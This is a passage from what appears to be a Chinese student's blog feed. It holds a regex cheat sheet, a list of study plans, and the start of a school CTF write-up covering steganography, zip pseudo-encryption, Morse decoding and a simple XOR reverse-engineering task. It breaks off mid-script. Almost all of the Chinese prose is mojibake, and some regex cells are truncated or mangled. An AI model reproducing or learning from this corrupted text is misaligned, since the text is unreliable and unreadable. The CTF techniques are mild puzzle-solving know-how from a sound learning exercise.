align="center">åŒ¹é…patternä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨æˆ–å­—ç¬¦â€œ`(</td></tr><tr><td align="center">(?=pattern)</td><td align="center">æ­£å‘è‚¯å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€œ`Windows(?=95</td></tr><tr><td align="center">(?!pattern)</td><td align="center">æ­£å‘å¦å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚â€œ`Windows(?!95</td></tr><tr><td align="center">(?&lt;=pattern)</td><td align="center">åå‘è‚¯å®šé¢„æŸ¥ï¼Œä¸æ­£å‘è‚¯å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚ï¼Œâ€œ`(?&lt;=95</td></tr><tr><td align="center">(?&lt;!pattern)</td><td align="center">åå‘å¦å®šé¢„æŸ¥ï¼Œä¸æ­£å‘å¦å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚â€œ`(?&lt;!95</td></tr><tr><td align="center">x|y</td><td align="center">åŒ¹é…xæˆ–yã€‚ä¾‹å¦‚ï¼Œâ€œ`z</td></tr><tr><td align="center">[xyz]</td><td align="center">å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[abc]</code>â€å¯ä»¥åŒ¹é…â€œ<code>plain</code>â€ä¸­çš„â€œ<code>a</code>â€ã€‚</td></tr><tr><td align="center">[^xyz]</td><td align="center">è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[^abc]</code>â€å¯ä»¥åŒ¹é…â€œ<code>plain</code>â€ä¸­çš„â€œ<code>p</code>â€ã€‚</td></tr><tr><td align="center">[a-z]</td><td align="center">å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[a-z]</code>â€å¯ä»¥åŒ¹é…â€œ<code>a</code>â€åˆ°â€œ<code>z</code>â€èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚</td></tr><tr><td align="center">[^a-z]</td><td align="center">è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>[^a-z]</code>â€å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨â€œ<code>a</code>â€åˆ°â€œ<code>z</code>â€èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚</td></tr><tr><td align="center">\b</td><td align="center">åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>er\b</code>â€å¯ä»¥åŒ¹é…â€œ<code>never</code>â€ä¸­çš„â€œ<code>er</code>â€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œ<code>verb</code>â€ä¸­çš„â€œ<code>er</code>â€ã€‚</td></tr><tr><td align="center">\B</td><td align="center">åŒ¹é…éå•è¯è¾¹ç•Œã€‚â€œ<code>er\B</code>â€èƒ½åŒ¹é…â€œ<code>verb</code>â€ä¸­çš„â€œ<code>er</code>â€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œ<code>never</code>â€ä¸­çš„â€œ<code>er</code>â€ã€‚</td></tr><tr><td align="center">\cx</td><td align="center">åŒ¹é…ç”±xæŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\cMåŒ¹é…ä¸€ä¸ªControl-Mæˆ–å›è½¦ç¬¦ã€‚xçš„å€¼å¿…é¡»ä¸ºA-Zæˆ–a-zä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°†cè§†ä¸ºä¸€ä¸ªåŸä¹‰çš„â€œ<code>c</code>â€å­—ç¬¦ã€‚</td></tr><tr><td align="center">\d</td><td align="center">åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[0-9]ã€‚</td></tr><tr><td align="center">\D</td><td align="center">åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[^0-9]ã€‚</td></tr><tr><td align="center">\f</td><td align="center">åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº\x0cå’Œ\cLã€‚</td></tr><tr><td align="center">\n</td><td align="center">åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº\x0aå’Œ\cJã€‚</td></tr><tr><td align="center">\r</td><td align="center">åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº\x0då’Œ\cMã€‚</td></tr><tr><td align="center">\s</td><td align="center">åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº[ \f\n\r\t\v]ã€‚</td></tr><tr><td align="center">\S</td><td align="center">åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº[^ \f\n\r\t\v]ã€‚</td></tr><tr><td align="center">\t</td><td align="center">åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x09å’Œ\cIã€‚</td></tr><tr><td align="center">\v</td><td align="center">åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x0bå’Œ\cKã€‚</td></tr><tr><td align="center">\w</td><td align="center">åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚ç­‰ä»·äºâ€œ<code>[A-Za-z0-9_]</code>â€ã€‚</td></tr><tr><td align="center">\W</td><td align="center">åŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ã€‚ç­‰ä»·äºâ€œ<code>[^A-Za-z0-9_]</code>â€ã€‚</td></tr><tr><td align="center">\x<em>n</em></td><td align="center">åŒ¹é…<em>n</em>ï¼Œå…¶ä¸­<em>n</em>ä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>\x41</code>â€åŒ¹é…â€œ<code>A</code>â€ã€‚â€œ<code>\x041</code>â€åˆ™ç­‰ä»·äºâ€œ<code>\x04&amp;1</code>â€ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ASCIIç¼–ç ã€‚.</td></tr><tr><td align="center">*num*</td><td align="center">åŒ¹é…<em>num</em>ï¼Œå…¶ä¸­<em>num</em>æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€è·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>(.)\1</code>â€åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚</td></tr><tr><td align="center">*n*</td><td align="center">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ*n<em>ä¹‹å‰è‡³å°‘</em>n<em>ä¸ªè·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™</em>n<em>ä¸ºå‘åå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœ</em>n<em>ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™</em>n*ä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚</td></tr><tr><td align="center">*nm*</td><td align="center">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ*nm<em>ä¹‹å‰è‡³å°‘æœ‰</em>nm<em>ä¸ªè·å¾—å­è¡¨è¾¾å¼ï¼Œåˆ™</em>nm<em>ä¸ºå‘åå¼•ç”¨ã€‚å¦‚æœ\</em>nm<em>ä¹‹å‰è‡³å°‘æœ‰</em>n<em>ä¸ªè·å–ï¼Œåˆ™</em>n<em>ä¸ºä¸€ä¸ªåè·Ÿæ–‡å­—</em>m<em>çš„å‘åå¼•ç”¨ã€‚å¦‚æœå‰é¢çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè‹¥</em>n<em>å’Œ</em>m<em>å‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™\</em>nm<em>å°†åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼</em>nm*ã€‚</td></tr><tr><td align="center">*nml*</td><td align="center">å¦‚æœ<em>n</em>ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-3ï¼‰ï¼Œä¸”<em>må’Œl</em>å‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼<em>nm</em>lã€‚</td></tr><tr><td align="center">\u<em>n</em></td><td align="center">åŒ¹é…<em>n</em>ï¼Œå…¶ä¸­<em>n</em>æ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„Unicodeå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\u00A9åŒ¹é…ç‰ˆæƒç¬¦å·ï¼ˆÂ©ï¼‰ã€‚</td></tr></tbody></table><h3 id="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"><a href="#å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"></a>å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼</h3><table><thead><tr><th align="center">ç”¨æˆ·å</th><th>/^[a-z0-9_-]{3,16}$/</th></tr></thead><tbody><tr><td align="center">å¯†ç </td><td>/^[a-z0-9_-]{6,18}$/</td></tr><tr><td align="center">åå…­è¿›åˆ¶å€¼</td><td>/^#?([a-f0-9]{6}|[a-f0-9]{3})$/</td></tr><tr><td align="center">ç”µå­é‚®ç®±</td><td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$/ /^[a-z\d]+(.[a-z\d]+)*@(<a href="-%5B%5Cda-z%5D">\da-z</a>?)+(.{1,2}[a-z]+)+$/</td></tr><tr><td align="center">URL</td><td>/^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]*)*/?$/</td></tr><tr><td align="center">IP åœ°å€</td><td>/((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/ /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/</td></tr><tr><td align="center">HTML æ ‡ç­¾</td><td>/^&lt;([a-z]+)([^&lt;]+)*(?:&gt;(.*)&lt;/\1&gt;|\s+/&gt;)$/</td></tr><tr><td align="center">åˆ é™¤ä»£ç \æ³¨é‡Š</td><td>(?&lt;!http:|\S)//.*$</td></tr><tr><td align="center">Unicodeç¼–ç ä¸­çš„æ±‰å­—èŒƒå›´</td><td>/^[\u2E80-\u9FFF]+$/</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºä¸€äº›è®¡åˆ’</title>
    <link href="/2021/01/29/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/"/>
    <url>/2021/01/29/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘æ²¡å•¥åŠ¨åŠ²ï¼Œè™šåº¦äº†å‡ å¤©ï¼Œæƒ³æƒ³å¯èƒ½æ˜¯å› ä¸ºæ²¡æœ‰è®¡åˆ’çš„åŸå› ã€‚æ‰€ä»¥å†³å®šå†™å‡ºæ¥ç£ä¿ƒä¸€ä¸‹è‡ªå·±==</p><h1 id="è¯¦æƒ…"><a href="#è¯¦æƒ…" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h1><p>1ã€å…³äºphpçš„å­¦ä¹ ï¼Œç»è¿‡è¿™æ¬¡è®­ç»ƒèµ›ï¼Œå‘ç°å¯¹phpå…¶å®å¹¶ä¸ç†Ÿç»œ(ä¹‹å‰çœ‹åªæ˜¯çœ‹ä¸ªç®€å•çš„ç»“æ„)ï¼Œphpæ˜¯éå¸¸é‡è¦çš„ï¼Œç›¸å¯¹çš„javaä¹Ÿæ˜¯å•¦ï¼ï¼Œè®¡åˆ’å°±æ˜¯è·Ÿç€å®˜æ–¹æ–‡æ¡£ç»†ç»†ç ”ç©¶ï¼Œä¸»è¦è¿˜æ˜¯è®°å„ç§ç‰¹æ€§ï¼Œè¿˜æœ‰ç›¸å…³çš„æ¼æ´ã€‚</p><p>2ã€å°½é‡æ¯å¤©éƒ½åˆ·1é¢˜ctfé¢˜ï¼ï¼ï¼ï¼Œåˆ·é¢˜æ˜¯æ‰©å……çŸ¥è¯†é¢çš„å¥½æ–¹æ³•ï¼Œå…³é”®ä¸åœ¨äºåˆ·é¢˜ï¼Œè€Œåœ¨äºè¿™ä¸ªè¿‡ç¨‹å­¦ä¹ åˆ°çš„æ–°çš„çŸ¥è¯†ï¼ï¼</p><p>3ã€è®°å¾—çœ‹ä¸€ä¸‹å¸¦å›æ¥çš„é‚£æœ¬ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹=ã€‚=ï¼Œç»è¿‡è¿™æ¬¡è®­ç»ƒèµ›ï¼Œå‘ç°è‡ªå·±å¯¹ç¨‹åºé€†å‘åˆ†ææŒºæœ‰å…´è¶£çš„(ä¹Ÿå¯èƒ½æ˜¯å‡ºçš„å¤ªç®€å•äº†)ã€‚æ€»è€Œè¨€ä¹‹ï¼Œé€†å‘åˆ†ææœ¬è´¨ä¹Ÿæ˜¯ä»£ç å®¡è®¡ï¼Œè¿™æ˜¯ååˆ†å¿…è¦çš„èƒ½åŠ›</p><p>4ã€è¿˜æœ‰å„ç§pdfæ‰«ææ»´ä¹¦éƒ½è¦çœ‹çœ‹~å¯’å‡é›†è®­çš„ç«¯å£å­¦ä¹ ä¹Ÿæœ‰ç›¸å…³ä¹¦ç±ï¼Œå¯ä»¥é€šè¿‡è¿™äº›èµ„æ–™å­¦ä¹ ä¸€ä¸‹</p><p>5ã€2~3å¤©å­¦ä¹ ä¸€ä¸ªkaliçš„å·¥å…·ï¼Œkaliè®¸å¤šå·¥å…·ç¡®å®æœ‰å¾ˆå¤šå¸®åŠ©ï¼Œä¹Ÿæ˜¯éå¸¸åŸºç¡€çš„ï¼ï¼ï¼</p><p>6ã€é”»ç‚¼èº«ä½“ã€‚</p><p>åªæœ‰åŠªåŠ›æœ‰æˆæœäº†ï¼ŒåŠªåŠ›æ‰ä¼šè¢«åˆ«äººçœ‹åˆ°ï¼ŒåŠ æ²¹åŠ æ²¹</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
    <tags>
      
      <tag>éšç¬”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å­¦æ ¡ctfè®­ç»ƒèµ›çš„wp</title>
    <link href="/2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/"/>
    <url>/2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€æ¬¡ä¸ºæœŸåå¤©çš„è®­ç»ƒèµ›ï¼Œæ£€éªŒäº†å‰æ®µæ—¶é—´æ‰€å­¦ï¼Œä¹Ÿè®¤è¯†äº†å¾ˆå¤šä¸è¶³~~~æœ‰2é¢˜å¥½åƒå¥½ç®€å•ä½†æ²¡å•¥å¤´ç»ªï¼Œåˆ°åé¢å¿ƒæ€ä¹Ÿæ²¡å‰å‡ å¤©é‚£ä¹ˆå¥½äº†ï¼Œæœ‰ã€ã€æµ®èºï¼ŒåŸºæœ¬éƒ½æ²¡æ€ä¹ˆåšé¢˜ï¼Œè¿˜è¦åŠªåŠ›å‘€</p><p><img src="https://i.loli.net/2021/02/13/FKsAV1k6ML2vE9q.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>linuxä¸‹å‘½ä»¤è¡Œ<code>strings æ–‡ä»¶å</code> å³å¾—flag</p><h2 id="å›¾ç‰‡ä¸­çš„å¯†ç "><a href="#å›¾ç‰‡ä¸­çš„å¯†ç " class="headerlink" title="å›¾ç‰‡ä¸­çš„å¯†ç "></a>å›¾ç‰‡ä¸­çš„å¯†ç </h2><p>éšå†™ï¼Œbinwalkå¾—åŠ å¯†çš„å‹ç¼©åŒ…ï¼Œå¯†ç åœ¨æ³¨é‡Šä¸­ï¼Œè§£å‹ å³å¾—flag</p><h2 id="Lsb"><a href="#Lsb" class="headerlink" title="Lsb"></a>Lsb</h2><p>Lsbä½ä½éšå†™ï¼Œstegsolveçœ‹ä¸€ä¸‹å›¾ç‰‡çš„ä½ä½é€šé“</p><p>ç¡®å®šä¸ºçº¢ç»¿è“0é€šé“ï¼›data extractå¾—åˆ°504bå¼€å¤´çš„ä¸€å †ä¸œè¥¿ï¼ŒçŒœæµ‹ä¸ºå‹ç¼©åŒ…</p><p>å¦å­˜ä¸ºã€è§£å‹å³å¾—flag</p><h2 id="Fakenews"><a href="#Fakenews" class="headerlink" title="Fakenews"></a>Fakenews</h2><p>1.ä¼ªåŠ å¯†ï¼Œä¿®æ”¹å³å¯ï¼Œå¾—åˆ°docxæ–‡ä»¶</p><p>2.binwalkå°†docxæ–‡ä»¶åˆ†ç¦»</p><p><img src="https://i.loli.net/2021/02/13/Z2suSinPt6zgRew.png"></p><p>æ‰“å¼€æ–‡ä»¶documentå³å¾—flag(ä¸ºäº†é¿å…ç›´æ¥æœç´¢flagè¿˜å»æ‰äº†f~~~)</p><p><img src="https://i.loli.net/2021/02/13/LHkGMKzg74lphd1.png"></p><h2 id="Hackmeok"><a href="#Hackmeok" class="headerlink" title="Hackmeok"></a>Hackmeok</h2><p><img src="https://i.loli.net/2021/02/13/1NmJpRkdxIGrZq3.png"></p><p>ä¸‹è½½å¾—ä¸€ä¸ªè™šæ‹Ÿç›˜ï¼Œæ‰“å¼€æœ‰ä¸€txtæ–‡ä»¶å†…å®¹å¦‚ä¸Šï¼Œæç¤ºåˆ æ‰äº†è§†é¢‘ï¼Œflagæ˜¯ä¸­æ–‡å’Œæ ‡ç‚¹ç¬¦å·</p><p>winhexä¿®å¤è§†é¢‘æ–‡ä»¶</p><p><img src="https://i.loli.net/2021/02/13/I4xDeUzijdMJbQ5.png"></p><p>å¾—åˆ°è¿™ä¸ªè§†é¢‘</p><p><img src="https://i.loli.net/2021/02/13/OunDKr87C9JMSgI.png"></p><p>æˆªå›¾ä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/02/13/y9ngPbqIzXD7Wij.png"></p><p>-..â€”-.â€“â€¦../â€“..â€“â€¦-.â€”-/-..â€”-.â€“.-â€¦-/-..â€”â€¦..â€“.-/-..â€”.-â€¦.â€“./â€“â€¦-â€¦.-â€¦-/â€”.â€“.-â€¦.-../â€”â€”â€“â€¦.â€“../-.-.-..â€“..-â€¦/-.-.-..â€“..-â€¦/-.-.-..â€“..-â€¦/-.-.-..â€“..-â€¦/-.-.-..â€“..-â€¦/â€”â€”â€“â€¦â€¦.-</p><p>æ‰¾ä¸ªä¸­æ–‡æ‘©æ–¯ç½‘ç«™è§£å¯†ä¸€ä¸‹å¾—åˆ°flagï¼š</p><p><img src="https://i.loli.net/2021/02/13/XAtjHUGdYN7zopL.png"></p><h2 id="ç”Ÿå‘½æ˜¯æœ‰å…‰çš„"><a href="#ç”Ÿå‘½æ˜¯æœ‰å…‰çš„" class="headerlink" title="ç”Ÿå‘½æ˜¯æœ‰å…‰çš„"></a>ç”Ÿå‘½æ˜¯æœ‰å…‰çš„</h2><p>å¾—åˆ°å‹ç¼©åŒ…ï¼Œæç¤ºè§£å‹å¯†ç ä¸º6ä½å°å†™å­—æ¯</p><p>çˆ†ç ´å¤ªä¹…ï¼Œçœ‹ä¸€ä¸‹æ–‡ä»¶åï¼Œç»“åˆé¢˜ç›®åçŒœæµ‹ä¸ºï¼šiloveu</p><p><img src="https://i.loli.net/2021/02/13/qOvTngsQhXUaKcP.png"></p><p>è§£å‹å³å¾—å›¾ç‰‡</p><p><img src="https://i.loli.net/2021/02/13/yTcmSpA9hwOMRfF.png"></p><p>binwalkåˆ†æä¸å‡ºéšè—æ–‡ä»¶ï¼Œhxdçœ‹ä¸€ä¸‹å‘ç°æ˜¯å­˜åœ¨zipå‹ç¼©åŒ…çš„ï¼Œä½†å‡ºé¢˜äººå°†504båçš„ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°è°ƒæ¢äº†ä½ç½®ï¼Œæˆ‘ä»¬æ¢å›æ¥å°±å¯ä»¥äº†</p><p><img src="https://i.loli.net/2021/02/13/lV5cLeqXJpzja1S.png"></p><p>å¾—åˆ°çš„å‹ç¼©åŒ…ä¸­å…¶å®æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä½†å¦ä¸€ä¸ªpassword.txtåªæœ‰504b0102å¼€å¤´çš„ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å‹ç¼©åŒ…ä¸­æ˜¯çœ‹ä¸åˆ°ä»–çš„åå­—çš„</p><p>å½“æ—¶æˆ‘æ‰“ç®—foremostçœ‹èƒ½ä¸èƒ½çˆ†ä¸€ä¸‹å†…å®¹ï¼Œä¸è¡Œå†æ‰‹åŠ¨æ”¹å‹ç¼©åŒ…</p><p>foremostç»“æœï¼š</p><p><img src="https://i.loli.net/2021/02/13/sXikLbvPOMT7qut.png"></p><p>æ˜¾ç„¶password.txtæ²¡ç”¨ï¼Œåªæ˜¯æç¤ºå’±ä»¬è¿™ä¸ªå‹ç¼©åŒ…æ˜¯ä¼ªåŠ å¯†ï¼Œ0900æ”¹æˆ0000å³å¾—flagæ–‡ä»¶ï¼</p><p><img src="https://i.loli.net/2021/02/13/RdSFf2MpgYL1keH.png"></p><p>è¿™ä¸ªæ ¼å¼æ˜¯MP3ï¼Œæ”¹ä¸€ä¸‹åç¼€åå³å¯</p><p><img src="https://i.loli.net/2021/02/13/pRYwnotKLPsCE46.png"></p><p>å¾—åˆ°äº†ä¸€ä¸ªå¤¹æ‚ç€è‹±è¯­å¬åŠ›å’Œå—¨æ­Œçš„mp3æ–‡ä»¶ï¼Œä½¿åŠ²å¬qaqï¼Œä¸è¿‡æœ€åè¿˜æ˜¯æ±‚åŠ©äº†å­¦é•¿æ‰å¾—flagï¼Œå¬çš„äººéº»äº†ï¼Œè¿˜æŠŠé«˜ä¸­ç­é•¿æ‹‰æ¥ä¸€èµ·æŠ˜ç£¨~~~</p><p>æç¤ºflagä¸ºå…­ä¸ªå•è¯ï¼šflag{itâ€™s_really_fun_to_compress_data}</p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Easyreverse"><a href="#Easyreverse" class="headerlink" title="Easyreverse"></a>Easyreverse</h2><p>å¦‚å›¾~~</p><p><img src="https://i.loli.net/2021/02/13/3w4yvu9OejHfnT8.png"></p><h2 id="Easyc"><a href="#Easyc" class="headerlink" title="Easyc"></a>Easyc</h2><p>æä¾›äº†ä¸€ä¸ªexeæ–‡ä»¶å’Œpass</p><blockquote><p>Passï¼šä¹Ÿå°±æ˜¯flagåŠ å¯†åçš„ç»“æœ103107097096122048104048113086048116095109053116116094066086119052114126094116049108114056050088067088109102110056119104056098095119115055103115099100124</p></blockquote><p>ç¨‹åºæ˜¯ç”¨cå†™çš„ï¼ŒIDAf5çœ‹ä¸€ä¸‹ä¼ªä»£ç </p><p>ä¸»å‡½æ•°ï¼š<br><img src="https://i.loli.net/2021/02/13/sn4WbovqXadOhJZ.png"></p><p>åŠ å¯†å‡½æ•°ï¼š<br><img src="https://i.loli.net/2021/02/13/BHk8aTb7c5Kwmrv.png"></p><p>åˆ†æå¯çŸ¥ï¼š<br>1.è¾“å…¥å­¦é•¿çš„å­¦å·ï¼š1707170129ï¼Œæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥çš„åŠ å¯†æ“ä½œ<br>2.è¾“å…¥è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œç¨‹åºå°±ä¼šè¾“å‡ºåŠ å¯†åçš„å­—ç¬¦ä¸²<br>æ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ©ç”¨ç»™å‡ºçš„åŠ å¯†å­—æ®µå’ŒåŠ å¯†å‡½æ•°ï¼Œæ±‚å¾—åŠ å¯†å‰çš„flag</p><blockquote><p>å¯¹ç¨‹åºå’Œpassåˆ†æå¯çŸ¥ï¼š<br>1.ä¸‰ä½æ•°å­—ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ™flag{xxxx}(åŒ…å«flag{}å…±51ä¸ªå­—ç¬¦)<br>2.a1=v6ä¹Ÿå°±æ˜¯flag;a2=str1ä¹Ÿå°±æ˜¯å­¦å·1707170129<br>3.åŠ å¯†å‡½æ•°ä¸­ï¼š<br>v7=flagï¼Œstr=å­¦å·1707170129ï¼Œv6=10(å­¦å·çš„é•¿åº¦)</p><p>Forå¾ªç¯(iâ€“flagé•¿åº¦)ï¼š<br>    v5=å­¦å·[i%10] - 48ï¼›</p><p>Sprintfï¼šå°†æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å†™å…¥v4æœ€åè¾“å‡ºï¼Œå°†åŸæœ¬ä¸€ä¸ªå­—ç¬¦è½¬æ¢ä¸º3ä¸ªæ•°å­—è¾“å…¥çš„v4ä¸­ã€‚<br>æ ¼å¼åŒ–æ–¹æ³•ï¼šv5^v7[i]ï¼›ç”±æ­¤å¯çŸ¥è¿˜åŸæ–¹æ³•:æ¯ä¸‰ä½æ•°ä¸V5äº¦æˆ–<br>æ±‚å„ä¸ªå­—ç¬¦çš„v5</p></blockquote><p><img src="https://i.loli.net/2021/02/13/3Ok9wPoH8JnIfru.png"></p><p>å³å¾—v5</p><p><img src="https://i.loli.net/2021/02/13/Zo74yGxDfgXlcjm.png"></p><p>å†å†™ä¸ªå°è„šæœ¬è·‘è·‘å³å¾—flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 